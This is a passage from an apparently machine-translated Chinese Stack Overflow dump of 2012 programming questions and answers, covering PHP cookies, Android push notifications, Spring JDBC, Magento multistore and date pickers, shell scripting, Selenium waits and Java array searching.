您无法在设置 cookie 的同一页面请求中读取 cookie。`$_COOKIE`超级全局数组（使用 this 而不是 deprecated ）`$HTTP_COOKIE_VARS`包含客户端发送给您的 cookie。在此页面加载中，您只是将 cookie 发送给客户端，因此客户端将在下一个页面加载时，他/她将向您发送 cookie，您将能够读取它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T10:24:49.633

```
<?php
$name   = 'cookieName';
$value  = date('d-m-Y H:i:s');
$expire = time() + 60 * 60 * 24 * 30; //cookie expires within 30 days    
// Set the cookie
setcookie( $name, $value, $expire );

// Get cookie value
if( isset($_COOKIE['cookieName']) ) {
    echo $_COOKIE['cookieName'];
}
?> 
```

我没测试。。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T10:17:20.547

首先`$HTTP_COOKIE_VARS`是不推荐使用`$_COOKIE`。

```
<?php
$value = date('d-m-Y H:i:s');
setcookie("DATENEW", $value, time()+3600*24);
echo $_COOKIE["DATENEW"];
?> 
```

**输出：** 21-11-2012 10:17:45

这对我有用。

# android - 使用 EtceteraAndroid 插件和 Urban Airship 统一 GCM

> ID：13490817
> 
> 赞同：1
> 
> 时间：2012-11-21T10:08:37.673
> 
> 标签：android, push-notification, urbanairship.com

我正在尝试在统一 3.5 制作的 Android 游戏上使用推送通知。这些是我所做的步骤：

我通过 prime31 购买了名为 EtceteraAndroid 的资产，并在其门户上创建了 urbanairship 应用程序。然后我像这样修改airshipconfig文件：

gcmSender = My_Proj_number 这里 transport = gcm developmentAppKey = devkey developmentAppSecret = dev secret key productionAppKey = devkey productionAppSecret = dev secret key（因为我没有Urban Airship的发布帐户）inProduction = false

*   我创建了谷歌帐户并在那里启用了 GCM，将服务器 API 密钥复制到 UrbanAirship GCM API 密钥
*   我添加了这里提到的一些权限[Using GCM, Urban Airship to send Push Notification](https://stackoverflow.com/questions/12787354/using-gcm-urban-airship-to-send-push-notification)
*   在代码中，我调用了 EtceteraAndroid 插件中提供的启用 Urbanair 推送功能。
*   我在我的 android 设备上构建并运行 apk。
*   我没有在 UrbanAirship 门户上找到任何注册的 APPID，因此在我的 android 设备上没有收到任何通知 :(

任何建议将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T17:53:43.830

我目前也在尝试解决与 Urban Airship 插件相关的问题。

根据 Prime 31 的说法，事情似乎应该开箱即用。但您可能已经注意到，GCM 支持已被弃用，Prime 的插件仍然依赖于 C2DM。

[也许您还应该在以下论坛帖子上发帖，](http://forum.unity3d.com/threads/92154-Prime31-Android-Plugins-Officially-Live!/page71)因为这是关于该主题的讨论。

话虽如此，即使 GCM 帐户不正确，我也可以让我的 APID 做出响应。但我无法收到任何推送通知。更具体地说，androidManifest.xml 的某些部分需要保持不变。这是我的 androidManifest.xml 配置：

```
<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.myCompany.myGame" android:installLocation="preferExternal" android:versionCode="1" android:versionName="1.0">
    <supports-screens
        android:smallScreens="true"
        android:normalScreens="true"
        android:largeScreens="true"
        android:xlargeScreens="true"
        android:anyDensity="true"/>

   <!-- The com.prime31.EtceteraApplication should be there -->
   <application android:name="com.prime31.EtceteraApplication"
                android:icon="@drawable/app_icon"
                android:label="@string/app_name"
                android:debuggable="true">

    <!-- These activities should be in there -->
    <activity android:name="com.unity3d.player.UnityPlayerProxyActivity"
              android:label="@string/app_name"
              android:configChanges="fontScale|keyboard|keyboardHidden|locale|mnc|mcc|navigation|orientation|screenLayout|screenSize|smallestScreenSize|uiMode|touchscreen">
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />
            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>

    <activity android:name="com.unity3d.player.UnityPlayerActivity"
              android:label="@string/app_name"
              android:configChanges="fontScale|keyboard|keyboardHidden|locale|mnc|mcc|navigation|orientation|screenLayout|screenSize|smallestScreenSize|uiMode|touchscreen">
    </activity>

    <activity android:name="com.unity3d.player.UnityPlayerNativeActivity"
              android:label="@string/app_name"
              android:configChanges="fontScale|keyboard|keyboardHidden|locale|mnc|mcc|navigation|orientation|screenLayout|screenSize|smallestScreenSize|uiMode|touchscreen">
        <meta-data android:name="android.app.lib_name" android:value="unity" />
        <meta-data android:name="unityplayer.ForwardNativeEventsToDalvik" android:value="true" />
    </activity>

    <activity android:name="com.unity3d.player.VideoPlayer"
              android:label="@string/app_name"
              android:screenOrientation="behind"
              android:configChanges="fontScale|keyboard|keyboardHidden|locale|mnc|mcc|navigation|orientation|screenLayout|screenSize|smallestScreenSize|uiMode|touchscreen">
    </activity>

    <!-- ACTIVITIES -->
    <activity android:name="com.prime31.EtceteraProxyActivity"></activity>
    <activity android:name="com.prime31.WebViewActivity" android:configChanges="orientation"></activity>
    <activity android:name="com.prime31.P31VideoPlayerActivity" android:configChanges="keyboard|keyboardHidden|orientation"></activity>
    <receiver android:name="com.urbanairship.CoreReceiver">
        <intent-filter>
            <action android:name="android.intent.action.BOOT_COMPLETED" />
            <action android:name="android.intent.action.ACTION_SHUTDOWN" />
        </intent-filter>
    </receiver>

    <receiver android:name="com.urbanairship.push.c2dm.C2DMPushReceiver" android:permission="com.google.android.c2dm.permission.SEND">
        <intent-filter>
            <action android:name="com.google.android.c2dm.intent.RECEIVE" />
            <category android:name="com.myCompany.myGame" />
        </intent-filter>
        <intent-filter>
            <action android:name="com.google.android.c2dm.intent.REGISTRATION" />
            <category android:name="com.myCompany.myGame" />
        </intent-filter>
        </receiver>
    <service android:name="com.urbanairship.push.PushService" android:process=":com.urbanairship.push.process" />
    <receiver android:name="com.prime31.P31UAIntentReceiver" />
</application>

<uses-feature android:glEsVersion="0x00010001" />
<uses-permission android:name="android.permission.INTERNET"/>
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<uses-permission android:name="android.permission.VIBRATE"/>
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/> 
<uses-permission android:name="android.permission.BROADCAST_STICKY"/>

<permission android:name="com.myCompany.myGame.permission.C2D_MESSAGE" android:protectionLevel="signature"/>
<uses-permission android:name="com.myCompany.myGame.permission.C2D_MESSAGE"/>
<uses-permission android:name="com.google.android.c2dm.permission.RECEIVE"/> 
```

如果您设法让推送通知正常工作，请告诉我，因为我无法让这部分工作！干杯!

# java - 使用 Spring JDBC 模板的连接异常

> ID：13490821
> 
> 赞同：5
> 
> 时间：2012-11-21T10:08:48.180
> 
> 标签：java, spring, spring-mvc, jdbc, jdbctemplate

我有一个使用 Spring 开发的简单 Web 应用程序，最近我遇到了一些数据库连接问题。我的数据库在 MS SQL Server 2005 上。

为了检索数据，我使用框架提供的 JDBCTemplate 类实现了几个 DAO。

有时我会得到这个例外：

```
org.springframework.web.util.NestedServletException: Request processing failed; nested exception is org.springframework.dao.DataAccessResourceFailureException: StatementCallback; SQL [SELECT [Campaigns].[CampaignID],[CampaignCode],[CampaignType],[StartDate],[EndDate],[Status],[FirstUpdate],[LastUpdate],[FirstUpdateUserID],[LastUpdateUserID],[CampaignDescriptions].[Description] FROM [Campaigns] INNER JOIN [CampaignDescriptions] ON [Campaigns].[CampaignID] = [CampaignDescriptions].[CampaignID] ORDER BY [StartDate] DESC]; Connection reset by peer: socket write error; nested exception is com.microsoft.sqlserver.jdbc.SQLServerException: Connection reset by peer: socket write error
    org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:894)
    org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:778)
    javax.servlet.http.HttpServlet.service(HttpServlet.java:617)
    javax.servlet.http.HttpServlet.service(HttpServlet.java:717) 
```

该异常似乎仅在执行报告的查询时发生。

我不明白是什么导致了这个问题。任何的想法？

执行查询的方法是：

```
@Transactional(propagation = Propagation.NEVER)
public Campaign[] getAll() {
    List<Campaign> campList = getJdbcTemplate()
            .query(BASE_QUERY,
                    new CampaignMapper());
    return campList.toArray(new Campaign[0]);
} 
```

异常消息中的位置`BASE_QUERY`相同。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T10:32:50.873

它有点像陈旧的连接问题。如果它很常见或第一个被执行（大部分时间），它可能仅在此查询中显示。

检查事项：

*   服务器端连接超时
*   连接池最小空闲超时
*   连接池使用前验证连接

# c++ - 默认参数值错误 [Visual C++ 2008 中的错误？]

> ID：13490822
> 
> 赞同：3
> 
> 时间：2012-11-21T10:08:55.393
> 
> 标签：c++, visual-studio, visual-c++, compiler-construction

尝试在我的代码中使用模板时遇到以下问题

我有一些从 C 函数调用的 C++ 代码。

问题是我在语句 1 和 2 的以下代码中得到不同的值。

```
Type id : unsigned int
statement 1 : 4
statement 2 : 1 
```

C++ 代码：

```
template <typename T>
void func(T* value, unsigned int len = sizeof(T)) {
     cout << "Type id : " << typeid(T).name() << endl;
     cout << "statement 1 " << sizeof(T) << endl;
     cout << "statement 2 " << len << endl;
}

template <typename T>
void func1(T data) {
    T val = data;
    func(&val);
}

void test(void *ptr, unsigned int len) {
   switch(len) {
      case 1:
          func1(*(static_cast<uint32_t *>(ptr))
          break;
   }
} 
```

这只发生在 Windows 上。在 Linux 上它工作正常。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T12:53:11.763

我得到4,4。您可能需要安装 SP

# selenium - Selenium RC：页面未完全加载

> ID：13490824
> 
> 赞同：0
> 
> 时间：2012-11-21T10:09:04.613
> 
> 标签：selenium, loading, page-break

当我运行我的 selenium rc 脚本页面时，由于 url 的变化而没有完全加载。

早些时候，当 url 是链接这个的东西时，它工作正常

```
https://testersworld.com/ 
```

但是现在它变成了（在运行之前更新了脚本中的 URL）

```
https://testersworld.com/#login 
```

因此，当我运行脚本时，浏览器会使用指定的 url 启动，但无法显示登录弹出窗口。

如何处理这个`https://testersworld.com/#login`在页面加载后弹出登录的问题。我使用了所有等待的方法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T12:56:04.750

尝试这个：

```
driver.manage().deleteAllCookies();
driver.get("https://testersworld.com/");
driver.manage().timeouts().implicitlyWait(3, TimeUnit.SECONDS); 
```

或者

```
driver.manage().deleteAllCookies();
driver.get("https://testersworld.com/");
Thread.sleep(1000); 
```

或在登录页面上选择定位器（例如输入登录（电子邮件）字段）：

```
String cssLocator=..blablabla...; 
```

并使用*fluentWait*机制：

```
 public WebElement fluentWait(final By locator){
        Wait<WebDriver> wait = new FluentWait<WebDriver>(driver)
                .withTimeout(30, TimeUnit.SECONDS)
                .pollingEvery(5, TimeUnit.SECONDS)
                .ignoring(NoSuchElementException.class);

        WebElement foo = wait.until(
new Function<WebDriver, WebElement>() {
            public WebElement apply(WebDriver driver) {
                        return driver.findElement(locator);
                }
                }
);
                           return  foo;              }     ;

fluentWait(By.cssSelector(cssLocator)); 
```

# jquery - jQuery Mobile web 应用程序的启动画面

> ID：13490829
> 
> 赞同：1
> 
> 时间：2012-11-21T10:09:15.460
> 
> 标签：jquery, jquery-mobile

我正在尝试为基于 jQuery Mobile 和 ASP.Net MVC 的网站做一个闪屏。我的问题是我不能真正改变导航结构，因为所有的控制器都用在桌面版的网站上。站点的移动端只有单独的 *.Mobile.cshtml 视图，并且必须遵循与桌面站点相同的导航约定。

我要做的是在“主页”页面中创建一个像这样的 jQuery 移动“页面”：

```
@if (ViewBag.ShowSplash!= null && ViewBag.ShowSplash == true) 
{
    <div data-role="page" data-theme="a" id="splash">
        <div id="splash_container">
            <img src="@Url.Content("~/Content/images/splash_logo.png")" />
        </div>
    </div>
    <script>
        // once we display splash screen, give it 4 seconds and load main container
        $(document).on('pageinit', '#splash', function () {
            var hideSplash = function () {
                $.mobile.changePage($("#container"));
            };
            setTimeout(hideSplash, 4000);
        });
    </script>
} 
```

在`ViewBag.ShowSplash`控制器中设置的位置，检查是否在第一次加载时设置了 cookie。我面临的问题是，每当我回到主屏幕时，启动画面就会不断出现，即使 cookie 已设置并且`ViewBag.ShowSplash`在控制器中为空。我猜 JQM 正在缓存所有页面并且`#splash`无限期地卡在那里。

要修复 JQM 缓存，我将`#splash`像这样删除容器：

```
// Once main container is loaded, remove splash page-container so we can't come back to that thing again. Ever.
$(document).on('pageshow', '#container', function () {
    $('#splash').remove();
}); 
```

这有点适用于飞溅，但会破坏其他东西，比如导航。

我想知道是否有更简单的方法在 JQM 中进行启动屏幕，如果没有，有没有办法告诉 JQM 永远不要回到某个页面？

# umfpack - 使用 UMFPACK 求解系统，其中 x = (AtA)^-1 b

> ID：13490830
> 
> 赞同：3
> 
> 时间：2012-11-21T10:09:22.427
> 
> 标签：umfpack

我有一个稀疏矩阵 A，需要求解系统 (AtA)X = B。现在我将 At 乘以 A 并使用 AtA 来求解系统。是否有更快的替代方案（例如将 A 传递给 UMFPACK 并让它更快地找到分解）？

顺便说一下，A是矩形的。

# jquery - 执行客户端单元格验证 JQGrid

> ID：13490831
> 
> 赞同：1
> 
> 时间：2012-11-21T10:09:26.133
> 
> 标签：jquery, validation, jqgrid, large-data

我的 JQgrid 中有大量数据，其中几乎有 50 列。我现在面临的问题是我必须对网格的每个单元格执行验证操作。

验证操作如下：

*   长度检查
*   格式化检查
*   语义检查

其次，当前完成的特定列的重复检查是 O(n2)。

我还将数据从 excel 导入到网格中。在这种情况下，行数可能会很大......

实例停止，如果网格中的行数超过 200，性能最终会下降。

任何人都可以在这方面提出更好的解决方案或提高时间复杂度的技术。

# php - 更改为 SSL 域会在子域多存储设置（Magento）中丢失语言

> ID：13490832
> 
> 赞同：1
> 
> 时间：2012-11-21T10:09:27.770
> 
> 标签：php, magento, cookies, ssl

我有以下 Magento 多商店设置：

*   German.domain.com
*   英文域名.com
*   法语.domain.com

所有人都在使用

*   安全域名.com

作为 SSL 域。购物车和一切正常，除了语言回落到英语！

如果我在 German.domain.com（商店语言为德语）上并单击结帐，商店将被定向到 secure.domain.com。我在 German.domain.com 上添加的产品存在，但语言不再是德语。它又回到了英语！它不处理 cookie 域设置，否则购物车中的产品将不会被共享。

有没有人有想法或已经解决了这个问题。我认为必须有一个智能编码来解决这个问题。

谢谢

解决方案：富兰克林 P Strube 给出了正确的解决方案，但我在 index.php 中的 PHP 中对其进行了硬编码：

```
$mageRunCode = isset($_SERVER['MAGE_RUN_CODE']) ? $_SERVER['MAGE_RUN_CODE'] : '';
$mageRunType = isset($_SERVER['MAGE_RUN_TYPE']) ? $_SERVER['MAGE_RUN_TYPE'] : 'store';

if($_SERVER['SERVER_NAME'] != 'secure.domain.com' && isset($_SERVER['HTTP_REFERER'])) {
  $url = parse_url($_SERVER['HTTP_REFERER']);
  if($url['host'] == 'german.domain.com') {
    setcookie('language', 'german', 0, '/', '.domain.com');
  } elseif($url['host'] == 'french.domain.com') {
    setcookie('language', 'french', 0, '/', '.domain.com');
  } else {
    setcookie('language', 'english', 0, '/', '.domain.com');
  }
}

if($_SERVER['SERVER_NAME'] == 'secure.domain.com') {
  if(isset($_COOKIE['language'])) {
    $mageRunCode = $_COOKIE['language'];
  }
}

Mage::run($mageRunCode, $mageRunType); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T16:04:14.757

当您进行多商店设置时，您通常具有 .htaccess 规则，例如`SetEnvIf Host german.domain.com MAGE_RUN_CODE=domain_com_de`. 您的 .htaccess 文件中有哪些用于多商店的内容？

我的猜测是 Magento 使用的是英语，因为在您访问 secure.domain.com 的任何时候都会加载默认网站/商店。`Mage::log("$mageRunCode $mageRunType");`您可以通过在它正在执行的文件的最后一行的上方添加来验证这一点`Mage::run($mageRunCode, $mageRunType);`。确保在 System > Configuration > Developer 区域中启用了日志记录，然后检查 magento/var/system.log 中记录的内容。下面的解决方案可以帮助您实现您想要的。

**解决方案 #1**更改“系统 > 配置 > 常规 > Web”中的“将商店代码添加到 URL”设置可能会解决此问题，但可能会导致 URL 混乱。

**解决方案 #2**我不记得 Magento 是如何处理语言切换的（可能有一个神奇的查询字符串 var 可以为您执行此操作），但如果您想以编程方式执行此操作，您可以通过 cookie 和 ENV 在 htaccess 中完成所有操作变量：

```
# If they are coming from german domain, set the language cookie = german
RewriteCond %{HTTP_REFERER} german.domain.com
RewriteRule (.*) $1 [CO=language:german]

RewriteCond %{HTTP_REFERER} french.domain.com
RewriteRule (.*) $1 [CO=language:french]

# Multistore routing (you probably already have this somewhere)
SetEnvIf Host german.domain.com MAGE_RUN_CODE=german
SetEnvIf Host french.domain.com MAGE_RUN_CODE=french

# Cookie language detection (using mod_rewrite, set the mage env)
RewriteCond %{HTTP_COOKIE} language=german
RewriteRule (.*) $1 [E=MAGE_RUN_CODE:german]

RewriteCond %{HTTP_COOKIE} language=french
RewriteRule (.*) $1 [E=MAGE_RUN_CODE:french] 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-28T07:06:51.060

你能告诉我你是如何实现的吗

我有以下 Magento 多商店设置：

```
german.domain.com
english.domain.com
french.domain.com 
```

所有人都在使用

```
secure.domain.com 
```

作为 SSL 域。

我们通过根目录中的文件夹创建了多个网站，并通过相应的代码在管理员中创建网站。

但是当我们去结帐产品时，我们会收到一个找不到页面的错误...

# android - 在android中将java.lang.String转换为int

> ID：13490840
> 
> 赞同：-2
> 
> 时间：2012-11-21T10:09:35.290
> 
> 标签：android, string, tags, integer

如何在 Android 中将 java.lang.String 转换为 int？我写了这段代码，但它不起作用：

```
public static String code;
...
db.insertQuote(Integer.parseInt(code)); 
```

我使用这段代码，当我阅读 NFC 标签时，我希望这个函数能够运行，但它给了我一个错误，因为我使用真正的手机进行测试，我无法理解发生了什么。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-21T10:21:10.150

```
 int i=Integer.parseInt(stringvalue); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T10:14:28.260

因此，假设代码具有除数字以外的其他值，您应该调试并测试 的值`code`，如果它为空白，它也会抛出`NumberFormatException`，或者如果它的 NullPointerException，那么字符串代码可能尚未初始化。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-21T10:15:07.400

您确定`Code`在调用之前已正确初始化`Integer.parseInt(Code)`吗？如果`Code`仍然只是定义，但没有初始化（没有分配给`Code`），那么这就是你的问题。
除此之外，您必须确保它`Code`确实是一个数字，所以我建议以下内容：

```
public static String Code;
... //rest of your code here
if(Code != null)
{
  try
  {
    db.insertQuote(Integer.parseInt(Code));
  }
  catch(NumberFormatException e)
  {
    //execution will get here if Code is not a number
    //insert code to handle this chase
  }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-21T10:14:30.613

```
String number;
int x = Integer.valueOf(number); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-21T11:29:10.870

最简单的答案是：

```
 int i = Integer.parseInt(StringValue); 
```

# iphone - 可以在 viewDidDisappear 方法中释放对象吗？

> ID：13490848
> 
> 赞同：0
> 
> 时间：2012-11-21T10:09:54.447
> 
> 标签：iphone

我正在尝试释放用于设计用户界面的对象，主要是 UILabel 的。当我从一个屏幕导航到另一个屏幕时，在 viewDidDisappear 方法中释放标签对象是否安全？

而且我没有使用ARC。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T11:23:59.550

如果您在其中调用版本，`viewDidDisappear`将会有很多问题。

如果你从这个 parentView 呈现一个模态视图，viewDidDisappear 将被调用，此时会发生崩溃。

**在非 ARC 环境中释放对象的最佳位置是 dealloc 方法。**

**如果您使用的是 iOS 5 或更高版本，那么最好的选择是启用 ARC。**

# linux - 在linux中删除

> ID：13490859
> 
> 赞同：-1
> 
> 时间：2012-11-21T10:10:42.697
> 
> 标签：linux, shell

嘿，所以我有一些代码可以解决下面的问题，但我被卡住了它不起作用，我真的不知道我在做什么。

此脚本应删除垃圾箱目录的内容。如果使用 -a 选项，脚本应该从垃圾箱中删除所有文件。否则，脚本应将垃圾箱中的文件名一一显示，并要求用户确认是否应将其删除

```
#!/bin/sh

echo " The files in the dustbin are : "
ls ~/TAM/dustbin

read -p " Please enter -a to delete all files else you will be prompted to delete one    by one : " filename

read ans
if ["filename" == "-a"]
cat ~/TAM/dustbin
   rm -rf*
else
   ls > ~/TAM/dustbin
for line in `cat ~/TAM/dustbin`
do
   echo "Do you want to delete this file" $line
   echo "Y/N"
   read ans
   case "ans" in
      Y) rm $line ;;
      N) "" ;;
esac 
```

编辑版本

```
 if test ! -f ~/TAM/dustbin/*
then
echo "this directory is empty"
else
for resfile in ~/TAM/dustbin/*
do
   if test -f $resfile ; then
   echo "Do you want to delete $resfile"
   echo "Y/N"
   read ans
   if test $ans = Y ; then 
   rm $resfile
   echo "File $resfile was deleted"
   fi
   fi
done
fi 
```

但是，这可行现在我得到两个错误之一

第 4 行需要二元运算符或第 4 行：对许多参数

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:16:22.247

我看到一个明显的错误：

```
rm -rf* 
```

什么时候应该

```
rm -rf * 
```

被询问每次文件删除 - 添加*-i*键

```
rm -rfi * 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:19:25.110

这里有很多问题：

*   `*`在in之前缺少一个空格`rm`。需要该空间，以便 shell 可以识别通配符并对其进行扩展。

*   您真的要删除当前目录中的所有文件吗？如果没有，请指定路径`rm -rf /path/to/files/*`或`cd`进入目录，最好使用`cd /path/to/files || exit 1`.

*   我不明白脚本的逻辑。您显示一个垃圾箱，但如果用户提供`-a`，您将用所有非隐藏文件 ( `ls > dustbin`) 覆盖它。那是你要的吗？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T10:22:18.753

首先，`case "ans" of`只是将一个*字符串*“ans”匹配到其他字符串，这显然是错误的，你需要`case $ans of`获取变量的值`ans`。`if ["filename" == "-a"]`也是两个字符串之间的比较，这总是错误的。脚本的第一个参数可以作为`$1`（第二个 as`$2`以此类推）访问。

Please read `man 1 sh` to get the basics of shell programming (all of the above notes can be found there).

# php - 如何在后端 magento 中为 datepicker 添加时间

> ID：13490860
> 
> 赞同：1
> 
> 时间：2012-11-21T10:10:44.477
> 
> 标签：php, magento, datepicker

我正在使用 magento 1.7.2，我想添加带有时间的日期属性，以保存该产品的数据库中的日期和时间。

我曾尝试使用此代码在我的模块中使用 mysql-setup 文件添加新属性。

```
$setup->addAttribute('catalog_product', 'new_date', array(
    'group' => 'General',
    'input' => 'date',
    'type' => 'datetime',
    'label' => 'New Date',
    'backend' => 'eav/entity_attribute_backend_datetime',
    'visible' => 1,
    'required' => 0,
    'user_defined' => 1,
    'searchable' => 1,
    'filterable' => 1,
    'comparable' => 1,
    'visible_on_front' => 1,
    'visible_in_advanced_search' => 0,
    'is_html_allowed_on_front' => 1,
    'global' => Mage_Catalog_Model_Resource_Eav_Attribute::SCOPE_GLOBAL,
)); 
```

但这给了我只选择日期而不是时间。

请帮我。

谢谢。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-21T10:46:29.000

试试这个后端（任何管理面板形式）：

```
$fieldset->addField('your_column_name', 'date',array(
          'name'      =>    'image_link', /* should match with your table column name where the data should be inserted */
          'time'      =>    true,
          'class'     => 'required-entry',
          'required'  => true,        
          'format'    =>    $this->escDates(),
          'label'     =>    Mage::helper('featuredpopup')->__('From:'),
          'image'     =>    $this->getSkinUrl('images/grid-cal.gif')
      )); 
```

在格式中，您可以直接编写`'yyyy-MM-dd HH:mm:ss'`或另一种方法，例如

```
private function escDates() {
        return 'yyyy-MM-dd HH:mm:ss';   
    } 
```

希望这能给你一个想法。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2014-07-04T09:43:21.593

试试这些（适用于 Magento 1.8）：

```
 $this->addAttribute(Mage_Catalog_Model_Product::ENTITY, 'test_date_time', array(
     'input'         => 'datetime',
     'type'          => 'datetime',
     'time'          => true,
     'label'         => 'Date&Time',
     'visible'       => true,
     'required'      => false,
     'user_defined'  => true,
     'visible_on_front' => true,
     'backend'       => 'eav/entity_attribute_backend_time_created',
     'global'        => Mage_Catalog_Model_Resource_Eav_Attribute::SCOPE_GLOBAL
 )); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-22T05:41:10.257

你好检查**app/code/local/Magik/Popup/Block/Adminhtml/Popup/Edit/Tab/Form.php**

添加以下代码

```
$dateFormatIso=Mage::app()->getLocale()->getDateFormat(Mage_Core_Model_Locale::FORMAT_TYPE_SHORT);  
    $fieldset->addField("text_name", "date", array(
    "name"   => "text_name",
    "label"  => Mage::helper("modelname")->__("Start Date"),
    "title"  => Mage::helper("modelname")->__("Start Date"),
    "image"  => $this->getSkinUrl('images/grid-cal.gif'),
    "input_format" => Varien_Date::DATE_INTERNAL_FORMAT,
    "format"       => $dateFormatIso,
     "time" => false,
    "value" => "textstart", 
    )); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-11-18T05:59:06.163

创建自定义属性时，您只需要添加

`'input'=> 'datetime'`代替 `'input'=> 'date'`

# php - 如何访问/或获取函数中的变量？

> ID：13490862
> 
> 赞同：0
> 
> 时间：2012-11-21T10:10:44.927
> 
> 标签：php, variables

```
<?php
class test
{

    function __construct()
    {
        $methods = get_class_methods( get_class($this) )
        foreach($methods as $method)
        // question: how to get $get_me in function a() ?
        echo $this->method():$get_me;
    }

    function a()
    {
        $get_me = "good, take me home.";
    }
?> 
```

如何从外部函数 a() 访问 $get ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:13:21.570

你不能。

如果您的函数`a`实现是：

```
function a()
{
    return "good, take me home.";
} 
```

你可以这样做：

```
$get_me = $this->a(); 
```

在你的`__construct`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:13:19.307

你没有。您无法进入函数以从中获取任意变量。

`return`如果变量必须在函数外部可用，则将变量声明为类属性或函数的值。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T10:13:53.797

一种方法可以将 $get_me 声明为属性

```
<?php
class test
{
    public $get_me;
    function __construct()
    {
        $methods = get_class_methods( get_class($this) )
        foreach($methods as $method)
        // question: how to get $get_me in function a() ?
        $this->get_me;
    }

    function a()
    {
        $this->get_me = "good, take me home.";
    }
?> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-21T11:13:51.957

```
$result = functionname();
functionname()
{

..............//
return variablename;
} 
```

所以你可以得到函数之外的值。

# java - If 语句和使用 Java 中的循环搜索字符串数组

> ID：13490864
> 
> 赞同：2
> 
> 时间：2012-11-21T10:10:47.407
> 
> 标签：java, arrays, string, loops, if-statement

我对编码很陌生，对vb的了解有限。我试图在 java 中掌握这些知识，并试图创建一个简单的搜索 java 程序，该程序根据输入和输出信息搜索数组，以帮助了解循环和多维数组。

我不确定为什么我的代码不起作用，

```
package beers.mdarray;

import java.util.Scanner;

public class ProductTest
{
    public static void main(String[] arg)
    {
        String [][] beer = { {"TIGER", "2"}, {"BECKS", "2"}, {"STELLA", "3"} }; //creating the 2 by 3 array with names of beer and their corresponding stock levels.
        System.out.print("What beer do you want to find the stock of?: ");

        Scanner sc = new Scanner(System.in);
        String beerQ = sc.next(); // asking the user to input the beer name

        int tempNum = 1;
        if (!beerQ.equals(beer[tempNum][1]))
        {
            tempNum = tempNum + 1; //locating he location of the beer name in the array using a loop to check each part of the array.
        }
        System.out.println(beer[tempNum][2]); //printing the corresponding stock.
    }
} 
```

这是我得到的输出但是我不确定它的含义：

```
What beer do you want to find the stock of?: BECKS
Exception in thread "main" java.lang.ArrayIndexOutOfBoundsException: 2
at beers.mdarray.ProductTest.main(ProductTest.java:20) 
```

尽管它看起来像一个简单的问题，但使用搜索功能我找不到太多关于我的问题的信息。

可能有一种更简单的方法来做我正在尝试的事情，我会对此感兴趣，但我也想知道为什么我的方法不起作用。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-21T10:13:13.253

数组索引从`0`到`N - 1`，其中`N`是数组中元素的数量。所以 的索引是包含元素`2`的数组末尾的一个：`2`

```
System.out.println(beer[tempNum][2]);
                              // ^ only 0 and 1 are valid. 
```

请注意， 的初始化`tempNum`从数组中的第二个元素开始，啤酒的名称实际上在`beer[tempNum][0]`.

有关详细信息，请参阅 Java 语言规范的[数组](http://docs.oracle.com/javase/specs/jls/se7/html/jls-10.html)章节。

只需提及可用于迭代数组的扩展 for 循环：

```
String [][] beers = { {"TIGER",  "2"},
                      {"BECKS",  "2"},
                      {"STELLA", "3"} }; 

for (String[] beer: beers)
{
    if ("BECKS".equals(beer[0]))
    {
        System.out.println(beer[1]);
        break;
    }
} 
```

使用多维数组的替代方法是使用其中一种`Map`实现，其中啤酒的名称是键，库存水平是值：

```
Map<String, Integer> beers = new HashMap<String, Integer>();
beers.put("TIGER",  9);
beers.put("BECKS",  2);
beers.put("STELLA", 3);

Integer stockLevel = beers.get("BECKS");
if (stockLevel != null)
{
    System.out.println(stockLevel);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:36:31.547

在您询问问题的另一种解决方案的部分中，您可以尝试以下操作：

```
package com.nikoskatsanos.playground;

import java.util.Scanner;

public class ProductTest
{
    public static void main(String[] arg)
    {
        String [][] beer = { {"TIGER", "2"}, {"BECKS", "2"}, {"STELLA", "3"} }; //creating the 2 by 3 array with names of beer and their corresponding stock levels.
        System.out.print("What beer do you want to find the stock of?: ");

        Scanner sc = new Scanner(System.in);
        String beerQ = sc.next(); // asking the user to input the beer name

        boolean found = false;
        int index = 0;
        while(!found) {
            if(beer[index][0].equals(beerQ.toUpperCase())) {
                found = true;
                continue;
            }
            index ++;
        }
        System.out.println("The stock of " + beerQ + " is " + beer[index][1]); //printing the corresponding stock.
    }
} 
```

